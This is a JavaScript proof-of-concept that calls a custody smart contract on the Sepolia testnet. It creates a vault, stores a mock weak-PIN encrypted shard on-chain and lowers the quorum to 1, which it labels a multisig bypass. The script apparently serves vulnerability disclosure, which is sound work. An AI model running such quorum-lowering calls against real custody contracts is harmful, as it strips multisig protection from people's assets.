/**
 * Smart Contract Security PoC - Verified Custody
 * Demonstrates interaction with the on-chain custody contract
 */

const { ethers } = require("ethers");
const CryptoJS = require("crypto-js");

const RPC_URL = "https://ethereum-sepolia.publicnode.com";
const CUSTODY_ADDRESS = "0x3B3AD30e32fFef3dD598dd3EfDf6DCC392897786";
const PRIVATE_KEY = process.env.PRIVATE_KEY || "YOUR_PRIVATE_KEY_HERE"; // Set via: export PRIVATE_KEY=0x...

const ABI = [
    "function createVault(bytes32 _creator) external",
    "function addParticipant(bytes32 _creator, bytes32 _participant, string _shard) external",
    "function defineQuorum(bytes32 _creator, uint256 _minParticipants) external"
];

async function main() {
    console.log("Smart Contract PoC - Verified Custody\n");

    const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    const contract = new ethers.Contract(CUSTODY_ADDRESS, ABI, wallet);

    const balance = await provider.getBalance(wallet.address);
    console.log(`Wallet: ${wallet.address}`);
    console.log(`Balance: ${ethers.utils.formatEther(balance)} ETH\n`);

    // Use same vault format as extension does
    const vaultId = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("poc_vault_" + Date.now()));
    const participantId = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("user1"));

    try {
        // 1. Create vault
        console.log("=== Step 1: Creating Vault ===");
        const tx1 = await contract.createVault(vaultId, { gasLimit: 150000 });
        console.log(`TX: ${tx1.hash}`);
        await tx1.wait();
        console.log("Confirmed!\n");

        // 2. Add participant with SHORT shard (simulating weak PIN encrypted secret)
        console.log("=== Step 2: Adding Participant with Encrypted Shard ===");
        // Use a short, simple shard to avoid gas issues
        const weakPinShard = "0xPIN1234.aGVsbG8=.c2VjcmV0";  // Simulates weak PIN encrypted data

        const tx2 = await contract.addParticipant(vaultId, participantId, weakPinShard, { gasLimit: 250000 });
        console.log(`TX: ${tx2.hash}`);
        await tx2.wait();
        console.log("Confirmed! Encrypted shard now on-chain.\n");

        // 3. Quorum bypass - set to 1
        console.log("=== Step 3: Quorum Bypass (Setting to 1) ===");
        const tx3 = await contract.defineQuorum(vaultId, 1, { gasLimit: 100000 });
        console.log(`TX: ${tx3.hash}`);
        await tx3.wait();
        console.log("Confirmed! Multisig bypassed - quorum set to 1.\n");

        console.log("=== RESULTS ===");
        console.log(`Vault Create: https://sepolia.etherscan.io/tx/${tx1.hash}`);
        console.log(`Add Shard: https://sepolia.etherscan.io/tx/${tx2.hash}`);
        console.log(`Quorum Bypass: https://sepolia.etherscan.io/tx/${tx3.hash}`);

    } catch (e) {
        console.error("Error:", e.message);
        if (e.transactionHash) {
            console.log("Failed TX: https://sepolia.etherscan.io/tx/" + e.transactionHash);
        }
    }
}

main();
